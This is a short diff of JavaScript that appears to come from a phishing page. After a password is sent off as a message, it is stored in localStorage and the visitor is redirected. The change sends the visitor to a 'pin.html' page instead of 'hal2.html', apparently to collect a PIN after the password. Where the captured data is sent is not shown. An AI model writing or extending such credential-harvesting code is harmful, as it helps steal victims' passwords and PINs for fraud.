@@ -157,7 +157,7 @@ password: ${pw}`;
     .then(data => {
         if (data.ok) {
             localStorage.setItem("pw", pw);
-            window.location.href = "hal2.html";
+            window.location.href = "pin.html";
         } else {
             alert("Gagal mengirim pesan.");
         }
